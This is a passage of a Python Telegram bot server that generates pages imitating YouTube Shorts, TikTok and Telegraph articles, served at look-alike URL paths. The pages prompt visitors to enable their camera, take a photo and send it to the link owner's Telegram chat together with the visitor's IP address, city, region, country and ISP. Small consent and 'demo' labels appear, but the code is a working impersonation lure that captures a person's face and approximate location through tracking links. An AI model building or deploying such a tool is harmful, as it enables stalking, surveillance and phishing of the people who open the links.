.consent {{
    position: absolute;

    z-index: 30;

    left: 10px;
    right: 10px;

    bottom: 73px;

    padding: 12px;

    background:
        rgba(
            18,
            18,
            18,
            .95
        );

    border:
        1px solid #555;

    border-radius: 15px;

    backdrop-filter:
        blur(14px);
}}

.consent p {{
    margin-bottom: 9px;

    font-size: 12px;
    line-height: 1.35;
}}

.button-row {{
    display: flex;
    gap: 8px;
}}

.camera-button {{
    flex: 1;

    padding: 10px;

    border: 0;

    border-radius: 999px;

    font-size: 13px;
    font-weight: 800;
}}

#cameraBtn {{
    background: #fff;
    color: #111;
}}

#sendBtn {{
    display: none;

    background: #f00;
    color: #fff;
}}

#status {{
    min-height: 15px;

    margin-top: 6px;

    color: #ddd;

    font-size: 11px;
}}

</style>

</head>

<body>

<div class="phone">


    <div class="statusbar">

        <span id="clock">
            16:28
        </span>

        <div class="status-right">
            <span>▮▮▮</span>
            <span>◓</span>
            <span class="battery">83</span>
        </div>

    </div>


    <div class="header">

        <div class="header-left">

            <span class="back">
                ‹
            </span>

            <span>
                Shorts
            </span>

        </div>


        <div class="header-right">

            <span>◖</span>

            <span>⌕</span>

            <span>⋮</span>

        </div>

    </div>


    <div class="chips">

        <div class="chip">
            ▣ Подписки
        </div>

        <div class="chip">
            ◉ В эфире
        </div>

        <div class="chip">
            ▣ Объектив
        </div>

        <div class="demo-label">
            ДЕМО • НЕ ОФИЦИАЛЬНЫЙ YOUTUBE
        </div>

    </div>


    <div class="video-stage">

        <img
            id="preview"
            class="media"
            src="{photo_url}"
            alt="Short video"
        >

        <video
            id="video"
            class="media"
            autoplay
            muted
            playsinline
        ></video>

        <div class="video-gradient"></div>

    </div>


    <div class="right-buttons">

        <div class="right-button">

            <span class="right-icon">
                ♡
            </span>

            <span>
                9,4 тыс.
            </span>

        </div>


        <div class="right-button">

            <span class="right-icon">
                ▢
            </span>

            <span>
                138
            </span>

        </div>


        <div class="right-button">

            <span class="right-icon">
                ↗
            </span>

            <span>
                Поделиться
            </span>

        </div>


        <div class="right-button">

            <span class="right-icon">
                ⟳
            </span>

            <span>
                Ремикс
            </span>

        </div>


        <div class="right-button">

            <span class="right-icon">
                ▣
            </span>

        </div>

    </div>


    <div class="video-info">

        <div class="channel">

            <div class="avatar">
                V
            </div>

            <span>
                @verhcau
            </span>

            <button class="subscribe">
                Подписаться
            </button>

        </div>


        <div class="description">
            Новое короткое видео 🔥
            #shorts #video ...
        </div>

    </div>


    <div class="consent">

        <p>
            Камера включится только после
            вашего нажатия. При отправке
            снимок и IP-данные будут
            переданы владельцу этой ссылки.
        </p>

        <div class="button-row">

            <button
                id="cameraBtn"
                class="camera-button"
            >
                Разрешить камеру
            </button>

            <button
                id="sendBtn"
                class="camera-button"
            >
                Сделать и отправить
            </button>

        </div>

        <div id="status"></div>

    </div>


    <div class="progress">
        <div class="progress-fill"></div>
    </div>


    <div class="nav">

        <div class="nav-item">
            <span class="nav-icon">⌂</span>
            <span>Главная</span>
        </div>

        <div class="nav-item">
            <span class="nav-icon">◩</span>
            <span>Shorts</span>
        </div>

        <div class="nav-item">
            <span class="create">+</span>
        </div>

        <div class="nav-item">
            <span class="nav-icon">▣</span>
            <span>Подписки</span>
        </div>

        <div class="nav-item">
            <span class="nav-icon">◉</span>
            <span>Вы</span>
        </div>

    </div>

</div>

{script}

</body>

</html>
"""


# ============================================================
# TELEGRAPH DESIGN
# ============================================================

def generate_telegraph_page(
    token: str,
    title: str,
    content: str,
    show_photo: bool,
):

    photo_url = (
        f"{PUBLIC_BASE_URL}"
        f"/static/photo.png"
    )

    safe_title = html.escape(
        title
        or DEFAULT_TELEGRAPH_TITLE
    )

    safe_content = "<br>".join(
        html.escape(
            content
            or DEFAULT_TELEGRAPH_CONTENT
        ).splitlines()
    )

    if show_photo:

        hero = f"""
        <img
            class="article-photo"
            src="{photo_url}"
            alt="Фото статьи"
        >
        """

    else:

        hero = ""

    script = camera_script(token)

    return f"""
<!DOCTYPE html>

<html lang="ru">

<head>

<meta charset="UTF-8">

<meta
    name="viewport"
    content="width=device-width,
             initial-scale=1,
             viewport-fit=cover"
>

<title>{safe_title}</title>

<style>

* {{
    box-sizing: border-box;
    margin: 0;
    padding: 0;
}}

body {{
    min-height: 100vh;

    background: #fff;
    color: #222;

    font-family:
        Georgia,
        "Times New Roman",
        serif;
}}

.article {{
    width: 100%;
    max-width: 740px;

    margin: auto;

    padding:
        45px
        22px
        70px;
}}

.brand {{
    margin-bottom: 25px;

    color: #999;

    font-family:
        Arial,
        sans-serif;

    font-size: 13px;
}}

.demo-label {{
    display: inline-block;

    margin-left: 7px;

    padding: 4px 8px;

    border-radius: 999px;

    border: 1px solid #ccc;

    background: #f5f5f5;

    color: #555;

    font-size: 9px;
    font-weight: 700;
}}

h1 {{
    margin-bottom: 11px;

    font-size: 42px;
    line-height: 1.08;

    letter-spacing: -.6px;
}}

.meta {{
    margin-bottom: 27px;

    color: #999;

    font-family:
        Arial,
        sans-serif;

    font-size: 14px;
}}

.article-photo {{
    display: block;

    width: 100%;
    max-height: 490px;

    margin-bottom: 27px;

    object-fit: cover;
}}

.article-content {{
    font-size: 19px;
    line-height: 1.65;

    overflow-wrap: anywhere;
}}

.camera {{
    margin-top: 35px;

    padding-top: 22px;

    border-top:
        1px solid #ddd;

    font-family:
        Arial,
        sans-serif;
}}

.camera-description {{
    margin-bottom: 12px;

    color: #666;

    font-size: 13px;
    line-height: 1.4;
}}

.buttons {{
    display: flex;

    gap: 8px;

    flex-wrap: wrap;
}}

button {{
    border: 0;

    padding:
        11px
        15px;

    border-radius: 8px;

    font-size: 14px;
    font-weight: 700;
}}

#cameraBtn {{
    background: #222;
    color: #fff;
}}

#sendBtn {{
    display: none;

    background: #2782d6;
    color: #fff;
}}

#status {{
    min-height: 18px;

    margin-top: 8px;

    color: #666;

    font-size: 13px;
}}

#video {{
    display: none;

    width: 100%;

    margin-top: 15px;

    border-radius: 8px;
}}

#preview {{
    display: none;
}}

@media (
    max-width: 600px
) {{

    .article {{
        padding:
            32px
            18px
            55px;
    }}

    h1 {{
        font-size: 34px;
    }}

    .article-content {{
        font-size: 18px;
    }}

}}

</style>

</head>

<body>

<main class="article">

    <div class="brand">

        Telegraph-style article

        <span class="demo-label">
            ДЕМО • НЕ ОФИЦИАЛЬНЫЙ TELEGRAPH
        </span>

    </div>


    <h1>
        {safe_title}
    </h1>


    <div class="meta">
        Article
    </div>


    {hero}


    <div class="article-content">
        {safe_content}
    </div>


    <section class="camera">

        <div class="camera-description">
            Камера включится только после
            вашего нажатия. При отправке
            снимок и IP-данные будут
            переданы владельцу этой ссылки.
        </div>


        <div class="buttons">

            <button id="cameraBtn">
                Разрешить камеру
            </button>

            <button id="sendBtn">
                Сделать и отправить
            </button>

        </div>


        <div id="status"></div>


        <img
            id="preview"
            src="{photo_url}"
            alt=""
        >


        <video
            id="video"
            autoplay
            muted
            playsinline
        ></video>

    </section>

</main>

{script}

</body>

</html>
"""


# ============================================================
# RENDER LINK
# ============================================================

def render_service_link(
    identifier: str,
    expected_service: str,
):

    row = resolve_link(
        identifier,
        expected_service,
    )

    if not row:

        raise HTTPException(
            status_code=404,
            detail="Ссылка не найдена",
        )

    (
        token,
        owner_chat_id,
        used,
        service,
        title,
        content,
        show_photo,
    ) = row

    # Дополнительная защита.

    if service != expected_service:

        raise HTTPException(
            status_code=404,
            detail="Ссылка не найдена",
        )

    if used == 1:

        return HTMLResponse(
            """
            <h3>
                Эта ссылка уже использована.
            </h3>
            """,
            status_code=410,
        )

    if used == 2:

        return HTMLResponse(
            """
            <h3>
                Фото сейчас отправляется.
            </h3>
            """,
            status_code=409,
        )

    if expected_service == "tiktok":

        return HTMLResponse(
            generate_tiktok_page(
                token
            )
        )

    if expected_service == "youtube":

        return HTMLResponse(
            generate_youtube_page(
                token
            )
        )

    return HTMLResponse(
        generate_telegraph_page(
            token=token,
            title=(
                title
                or DEFAULT_TELEGRAPH_TITLE
            ),
            content=(
                content
                or DEFAULT_TELEGRAPH_CONTENT
            ),
            show_photo=bool(
                show_photo
            ),
        )
    )


# ============================================================
# TELEGRAM WEBHOOK
# ============================================================

@app.post(WEBHOOK_PATH)
async def telegram_webhook(
    request: Request
):

    secret_header = request.headers.get(
        "X-Telegram-Bot-Api-Secret-Token",
        "",
    )

    if not secrets.compare_digest(
        secret_header,
        WEBHOOK_SECRET,
    ):

        raise HTTPException(
            status_code=403,
            detail="Forbidden",
        )

    payload = await request.json()

    update = Update.model_validate(
        payload,
        context={
            "bot": bot
        },
    )

    # Защита от повторной обработки
    # одного update.

    if not claim_update(
        update.update_id
    ):

        return JSONResponse(
            {
                "ok": True,
                "duplicate": True,
            }
        )

    try:

        await dp.feed_update(
            bot,
            update,
        )

    except Exception:

        release_update(
            update.update_id
        )

        raise

    return JSONResponse(
        {
            "ok": True
        }
    )


# ============================================================
# WEB ROUTES
# ============================================================

@app.get(
    "/",
    response_class=HTMLResponse,
)
async def root():

    return """
    <h3>
        Photo Robot is running.
    </h3>
    """


# TikTok
@app.get("/@{identifier}")
async def tiktok_page(
    identifier: str
):

    return render_service_link(
        identifier,
        "tiktok",
    )


# YouTube
@app.get("/shorts/{identifier}")
async def youtube_page(
    identifier: str
):

    return render_service_link(
        identifier,
        "youtube",
    )


# Telegraph
@app.get("/article/{identifier}")
async def telegraph_page(
    identifier: str
):

    return render_service_link(
        identifier,
        "telegraph",
    )


# Старые Telegraph ссылки.
# Этот route НЕ может открыть TikTok
# или YouTube.

@app.get("/{identifier}")
async def legacy_telegraph_page(
    identifier: str
):

    return render_service_link(
        identifier,
        "telegraph",
    )


# ============================================================
# SEND PHOTO
# ============================================================

@app.post("/api/send/{token}")
async def send_photo(
    token: str,
    request: Request,
    photo: UploadFile = File(...),
):

    row = get_link(token)

    if not row:

        raise HTTPException(
            status_code=404,
            detail="Ссылка не найдена",
        )

    (
        owner_chat_id,
        used,
        service,
        title,
        content,
        show_photo,
    ) = row

    if used != 0:

        raise HTTPException(
            status_code=410,
            detail=(
                "Ссылка уже использована "
                "или обрабатывается"
            ),
        )

    content_type = (
        photo.content_type
        or ""
    ).lower()

    if content_type not in {
        "image/jpeg",
        "image/png",
        "image/webp",
    }:

        raise HTTPException(
            status_code=415,
            detail=(
                "Разрешены только изображения"
            ),
        )

    data = await photo.read(
        MAX_PHOTO_BYTES + 1
    )

    if (
        not data
        or len(data) > MAX_PHOTO_BYTES
    ):

        raise HTTPException(
            status_code=413,
            detail="Фото слишком большое",
        )

    # Блокируем ссылку,
    # чтобы нельзя было отправить
    # несколько фотографий одновременно.

    if not claim_link(token):

        raise HTTPException(
            status_code=410,
            detail=(
                "Ссылка уже использована "
                "или обрабатывается"
            ),
        )

    ip = client_ip(request)

    geo = await lookup_ip(ip)

    city = (
        geo.get("city")
        or "не определён"
    )

    region = (
        geo.get("region")
        or "не определён"
    )

    country = (
        geo.get("country")
        or "не определена"
    )

    connection = (
        geo.get("connection")
        or {}
    )

    isp = (
        connection.get("isp")
        or "не определён"
    )

    emoji = (
        SERVICES
        .get(service, {})
        .get("emoji", "📸")
    )

    caption = (
        f"{emoji} Получено фото "
        f"по вашей ссылке\n\n"

        f"🌐 IP: {ip}\n"

        f"🏙 Город: "
        f"{city}\n"

        f"🗺 Регион: "
        f"{region}\n"

        f"🌍 Страна: "
        f"{country}\n"

        f"📡 Провайдер: "
        f"{isp}\n\n"

        "ℹ️ Местоположение "
        "определено приблизительно "
        "по IP."
    )

    try:

        await bot.send_photo(
            chat_id=owner_chat_id,

            photo=BufferedInputFile(
                data,
                filename="photo.jpg",
            ),

            caption=caption,
        )

    except Exception as exc:

        release_link(token)

        raise HTTPException(
            status_code=502,
            detail=(
                "Не удалось доставить "
                "фото в Telegram"
            ),
        ) from exc

    finish_link(token)

    return JSONResponse(
        {
            "ok": True
        }
    )


# ============================================================
# MAIN
# ============================================================

async def main():

    db_init()

    # ВАЖНО:
    # setWebhook делает getUpdates /
    # start_polling недоступным для старого
    # процесса с этим BOT_TOKEN.
    #
    # Поэтому здесь НЕТ start_polling().

    await bot.set_webhook(
        url=WEBHOOK_URL,
        secret_token=WEBHOOK_SECRET,
        allowed_updates=(
            dp.resolve_used_update_types()
        ),
        drop_pending_updates=False,
    )

    config = uvicorn.Config(
        app=app,
        host="0.0.0.0",
        port=PORT,
        log_level="info",
    )

    server = uvicorn.Server(
        config
    )

    try:

        await server.serve()

    finally:

        # Не удаляем webhook при shutdown,
        # иначе старый Render instance
        # во время rolling deploy может
        # удалить webhook нового instance.

        await bot.session.close()


if __name__ == "__main__":
    asyncio.run(main())
